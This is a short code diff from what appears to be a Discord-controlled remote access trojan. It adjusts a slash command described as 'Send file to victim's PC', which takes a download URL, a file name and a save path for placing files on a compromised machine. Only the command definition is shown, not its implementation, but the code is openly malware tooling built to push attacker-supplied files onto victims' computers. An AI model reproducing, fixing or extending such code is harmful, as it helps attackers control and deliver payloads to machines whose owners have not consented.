@@ -13,7 +13,7 @@ class SendFiles(commands.Cog):
     @commands.slash_command(
         description="Send file to victim's PC",
         options=[
-            self.bot.victim,
+            bot.victim,
             discord.Option("url", description="Direct link to the file for sending", required=True),
             discord.Option("file_name", description="Name of the file after sending to PC", required=True),
             discord.Option("file_path", description="Path to which the file should be saved", required=False),
